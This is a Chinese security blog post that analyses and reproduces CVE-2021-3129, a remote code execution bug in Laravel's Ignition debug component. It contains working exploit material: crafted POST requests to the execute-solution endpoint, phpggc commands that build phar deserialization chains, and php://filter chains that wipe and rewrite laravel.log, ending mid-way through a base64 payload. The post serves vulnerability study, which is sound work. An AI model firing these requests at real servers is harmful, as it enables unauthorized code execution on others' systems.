

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="reader-l">
  <meta name="keywords" content="reader-l&#39;s blog,blog,reader-l,&#34;读者&#34;,&#34;reader-l web安全&#34;,&#34;攻防&#34;">
  <title>CVE-2021-3129-Laravel-DebugModeRce漏洞复现分析 - reader-l&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/List/">
                <i class="iconfont icon-link-fill"></i>
                List
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="CVE-2021-3129-Laravel-DebugModeRce漏洞复现分析">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-05-19 20:47" pubdate>
        2021年5月19日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.3k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      84
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CVE-2021-3129-Laravel-DebugModeRce漏洞复现分析</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：2021年6月12日 晚上
                
              </p>
            
            <div class="markdown-body">
              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在CISCN2021的线上初赛有一道题就是利用<code>file_get_contents</code>反序列化phar的题目，当时是完全没有头绪。最近逛<code>freebuf</code>的时候看到<code>CVE-2021-3129</code>漏洞复现分析文章，觉得相似。因此打算复现学习一波。</p>
<h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2.正文"></a>2.正文</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>​    Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。</p>
<p>​    2021年01月12日，<code>Laravel</code>被披露存在一个远程代码执行漏洞（<code>CVE-2021-3129</code>）。当<code>Laravel</code>开启了Debug模式时，由于<code>Laravel</code>自带的<code>Ignition </code>组件对<code>file_get_contents()</code>和<code>file_put_contents()</code>函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发<code>Phar</code>反序列化，最终造成远程代码执行。</p>
<h2 id="2-搭建环境"><a href="#2-搭建环境" class="headerlink" title="2.搭建环境"></a>2.搭建环境</h2><p>我一般是比较喜欢自己手动搭建的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/laravel/laravel.git    <span class="hljs-comment"># 下载laravel源码</span></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> laravel</span><br><span class="hljs-meta">$</span><span class="bash"> git checkout e849812    <span class="hljs-comment"># 切换到存在漏洞的分支</span></span><br><span class="hljs-meta">$</span><span class="bash"> composer install        <span class="hljs-comment"># 安装依赖</span></span><br><span class="hljs-meta">$</span><span class="bash"> composer require facade/ignition==2.5.1    <span class="hljs-comment"># 下载安装存在漏洞版本的组件</span></span><br><span class="hljs-meta">$</span><span class="bash"> php artisan serve --host=0.0.0.0   <span class="hljs-comment"># 启动服务器</span></span><br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/2.png" srcset="/img/loading.gif"></p>
<p>现在访问你搭建的环境后，会爆出如下异常：</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/1.png" srcset="/img/loading.gif"></p>
<p>要想解决这个异常，我们得根据<code>Ignition</code>（<code>Laravel 6+</code>默认错误页面生成器）提供了一个<code>solutions</code>，让我们在配置文件中给<code>Laravel</code>配置一个加密<code>APP_KEY</code>。</p>
<p>进入到laravel项目的根目录，将根目录里的”<code>.env.example</code>“重命名”<code>.env</code>“：</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/3.png" srcset="/img/loading.gif"></p>
<p>然后我们在刷新一下页面就可以了</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/4.png" srcset="/img/loading.gif"></p>
<h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3.漏洞分析"></a>3.漏洞分析</h2><p>漏洞就发生在上面提到的给我们提供<code>solutions</code>的<code>Ignition</code>组件（&lt;=2.5.1）中。</p>
<p><code>Ignition</code>下默认提供如下<code>Solutions</code>（<code>laravel/vendor/facade/ignition/src/Solutions/</code>）：</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/5.png" srcset="/img/loading.gif"></p>
<p>通过这些solutions，只要开发者通过点击按钮的方式，就可以快速修复一些错误。</p>
<p>而这次漏洞出现在其中一个<code>solutions</code>：<code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code></p>
<p>首先去瞅瞅如何调用<code>solution</code>，执行<code>solution</code>的控制器是<code>ExecuteSolutionController.php</code>(<code>vendor\facade\ignition\src\Http\Controllers\ExecuteSolutionController.php</code>)</p>
<p>可以发现先通过该方法<code>$request-&gt;getRunnableSolution();</code>获得<code>solution</code>，然后在调用获得的<code>solution</code>的<code>run</code>方法来处理可控的<code>parameters</code>参数传过去。</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/6.png" srcset="/img/loading.gif"></p>
<p>这次的漏洞点是出现在<code>MakeViewVariableOptionalSolution</code>在这个<code>solution</code>，我就跟进这个<code>MakeViewVariableOptionalSolution#run</code>方法看看。</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/7.png" srcset="/img/loading.gif"></p>
<p>上图代码简化后如下：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$contents = file<span class="hljs-constructor">_get_contents($<span class="hljs-params">parameters</span>[&#x27;<span class="hljs-params">viewFile</span>&#x27;])</span>;<br>file<span class="hljs-constructor">_put_contents($<span class="hljs-params">parameters</span>[&#x27;<span class="hljs-params">viewFile</span>&#x27;], $<span class="hljs-params">contents</span>)</span>;<br></code></pre></td></tr></table></figure>
<p>可以看到这里主要功能点是：读取一个给定的路径<code>$parameters[&#39;viewFile&#39;]</code>，并替换读取到的内容中的<code>$variableName</code>为<code>$variableName ?? &#39;&#39;</code>，之后写回文件中<code>$parameters[&#39;viewFile&#39;]</code>，这就是个矛盾点，相当于啥事情都没有干。。。</p>
<p>这里调用了<code>file_get_contents()</code>，同时参数可控的，所以或许可以通过<code>phar://</code>协议去触发反序列化（如果有开发人员利用该框架进行开发并且写出一个文件上传的功能，那我们可以通过上传一个恶意的Phar文件）。</p>
<h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4.漏洞复现"></a>4.漏洞复现</h2><h3 id="1-漏洞检测"><a href="#1-漏洞检测" class="headerlink" title="1.漏洞检测"></a>1.漏洞检测</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.12:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>168<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;xxxxxxx&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>只要我们发送以上数据包，并出现如下回显及证明存在该漏洞：</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/8.png" srcset="/img/loading.gif"></p>
<h3 id="2-复现方法：Phar反序列化（上传phar恶意文件）"><a href="#2-复现方法：Phar反序列化（上传phar恶意文件）" class="headerlink" title="2.复现方法：Phar反序列化（上传phar恶意文件）"></a>2.复现方法：Phar反序列化（上传phar恶意文件）</h3><p>使用<code>phpggc</code>工具生成一条<code>laravel</code>中存在的拓展的链子：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> .<span class="hljs-regexp">/phpggc Laravel/</span>RCE5 <span class="hljs-string">&quot;phpinfo();&quot;</span> --phar phar -o <span class="hljs-regexp">/home/</span>reader-l<span class="hljs-regexp">/Desktop/</span>phar.gif<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/9.png" srcset="/img/loading.gif"></p>
<p>将这个<code>phar.gif</code>传到目标服务器下。我们在复现中直接通过手动将其放置<code>laravel</code>目录下。</p>
<p>然后构造如下请求：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>223<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;phar:///home/www/wwwroot/127.0.0.1/laravel/phar.gif/test.txt&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>复现成功：</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/10.png" srcset="/img/loading.gif"></p>
<p>以上的漏洞利用方法得基于你能将我们构造的恶意<code>phar.gif</code>上传上去。利用比较有限。</p>
<p>接下来的方法利用范围更大一些。</p>
<h3 id="3-复现方法：利用laravel-log实现phar反序列化"><a href="#3-复现方法：利用laravel-log实现phar反序列化" class="headerlink" title="3.复现方法：利用laravel.log实现phar反序列化"></a>3.复现方法：利用<code>laravel.log</code>实现phar反序列化</h3><h4 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h4><p>​    默认情况下，<code>laravel</code>的日志文件是放置在<code>storage/logs/laravel.log</code>文件下，用来储存一些PHP的错误和一些堆栈追踪的相关信息。</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/11.png" srcset="/img/loading.gif"></p>
<p>而如今我们要控制这个文件内容，将我们的payload写进log文件里，相当于将该Log文件构造成恶意的phar文件，在利用这个漏洞进行反序列化利用。</p>
<p>实现将log文件转变成恶意的phar文件。</p>
<p><strong>首先要进行的步骤就是将这个日志文件进行清空。</strong></p>
<p>首先我们通过观察可以发现日志文件的大概格式：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[previous log entries]</span><br><span class="hljs-selector-attr">[prefix]</span><span class="hljs-selector-tag">PAYLOAD</span><span class="hljs-selector-attr">[midfix]</span><span class="hljs-selector-tag">PAYLOAD</span><span class="hljs-selector-attr">[suffix]</span><br></code></pre></td></tr></table></figure>
<p>看了这篇文章的师傅或许会想到使用<code>php://filter</code>中的<code>convert.base64-decode</code>过滤器的特性，直到都为不可见字符解码清空，达到将log清空的目的。</p>
<p><a target="_blank" rel="noopener" href="http://blog.orange.tw/2018/10/">http://blog.orange.tw/2018/10/</a></p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/12.png" srcset="/img/loading.gif"></p>
<p>进行如下尝试，可以发现使用<code>php://filter/convert.base64-decode/resource</code>可以忽略一些坏字符并且成功解码写入。</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/13.png" srcset="/img/loading.gif"></p>
<p>但是令人失望的是，这种方法并不能达到我们将log清空的目的。虽然使用PHP在对字符串进行Base64解码时会忽略任何的坏字符，但是一个字符除外<code>=</code>。如果我们使用<code>base64-decode</code>过滤器过滤一个<code>=</code>中间包含<code>a</code>的字符串，PHP将产生错误并且不返回任何内容。因此，我们想用base64-decode来进行坏字符的过滤，必须有控制整个文件的可能性，但是这是不可能的，因为我们能够往日志文件写入的数据只有一小部分，同时在日志文件中还存在比较难以解决的<strong>日期前缀</strong>以及一些<strong>堆栈跟踪的后缀</strong>。</p>
<p>尝试对日期前缀家进行解码。</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/15.png" srcset="/img/loading.gif"></p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/14.png" srcset="/img/loading.gif"></p>
<p>根据日期的不同，对前缀进行两次解码时，会得到不同大小的结果。当我们对它进行解码时，在第二种情况下，我们的payload将以2作为前缀，从而需要改变<code>base64</code>消息的对齐方式。</p>
<p>因此我们无法使用<code>php://filter/convert.base64-decode/resource</code>来实现清空日志文件的操作。</p>
<p>但是<code>php://filter</code>提供了一个新的方式：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=consumed/</span>resource=<span class="hljs-regexp">/path/</span>to/file.txt<br></code></pre></td></tr></table></figure>
<p>该方法可以帮助我们把日志给清空掉。</p>
<p><strong>第二个步骤是：往日志文件写入payload的同时，将前缀后缀这些无用的数据给清除掉，同时保留我们的payload。</strong></p>
<p>幸运的是我们修改日志文件内容的主要方式：<code>php://filter</code>不仅限于<code>base64</code>操作，还可以使用它来进行字符集转换的操作，比如：<code>UTF-16 到 UTF-8</code></p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/16.png" srcset="/img/loading.gif"></p>
<p>从上图可以发现，非常符合我们将<code>laravel.log</code>转化为<code>phar</code>文件的第二个关键步骤：留下我们的payload，将其他无用数据进行转换（最后清除），但是还是有点问题，因为我们的payload会在一次会在日志文件中出现两次，我们最后的转化后也还是出现了两次，在把其它无用数据清楚后，有可能会造成干扰，因此我们需要将第二次的payload进行删除。</p>
<p>参考文章作者提供了一种思路：因为<code>UTF-16</code>是基于两字节的，因此我们可以在payload最后面增加一个字节。</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">echo -ne &#x27;[Some prefix ]P<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>Y<span class="hljs-symbol">\0</span>L<span class="hljs-symbol">\0</span>O<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>D<span class="hljs-symbol">\0</span>X[midfix]P<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>Y<span class="hljs-symbol">\0</span>L<span class="hljs-symbol">\0</span>O<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>D<span class="hljs-symbol">\0</span>X[Some suffix ]&#x27; &gt; /tmp/test<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/17.png" srcset="/img/loading.gif"></p>
<p>完美的将第二个payload给去除，只留下一个。</p>
<p>现在我们需要的是实现将除payload以外的所有无用数据给清除掉。方法还是使用<code>base64-decode</code>!!!上面我们讨论过了，单单使用<code>base64-decode</code>并不能实现，但是可以配合<code>UTF-16 TO UTF-8</code>的字符集转换即可。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> -n TEST! | base64 | sed -E <span class="hljs-string">&#x27;s/./\0\\0/g&#x27;</span><br>V\0E\0V\0T\0V\0C\0E\0=\0<br>$ <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&#x27;[Some prefix ]V\0E\0V\0T\0V\0C\0E\0=\0X[midfix]V\0E\0V\0T\0V\0C\0E\0=\0X[Some suffix ]&#x27;</span> &gt; /tmp/<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">php &gt; <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt&#x27;</span>);<br>TEST!<br></code></pre></td></tr></table></figure>
<p>我们还有一个问题，<code>UTF-16</code>转换字符集的时候需要两字节才不会出现问题。</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/18.png" srcset="/img/loading.gif"></p>
<p>文章作者对此的解决方法是利用NULL字符去填充payload，将其从一字节填充到两字节，但是在PHP中加载带着NULL字符的文件是会爆出错误的：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">PHP Warnin<span class="hljs-variable">g:</span>  file_get_contents() expects parameter <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> <span class="hljs-keyword">a</span> valid path, <span class="hljs-built_in">string</span> given in php <span class="hljs-keyword">shell</span> code <span class="hljs-keyword">on</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>因此是无法通过注入存在NULL字符的payload到日志文件中的，但是<code>php://filter</code>存在一种过滤器解决了这个问题：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable">convert.quoted-printable-decode</a></p>
<p>我们可以将NULL字符通过使用<code>=00</code>进行编码，再用该过滤器进行解码即可。</p>
<p>最终使用的payload大概如下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">viewFile: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/</span>resource=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure>
<h4 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h4><p>清空日志：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">viewFile: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=consumed/</span>resource=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/19.png" srcset="/img/loading.gif"></p>
<p>发送<code>AA</code>无用字符：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>163<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;AA&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/21.png" srcset="/img/loading.gif"></p>
<p>再者，用<code>PHPGGC</code>生成一个payload。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc monolog/</span>rce1 system id --phar phar -o php:<span class="hljs-regexp">//</span>output | base64<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8</span>+DQq<span class="hljs-number">9</span>AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi<br><span class="hljs-attribute">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-attribute">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span 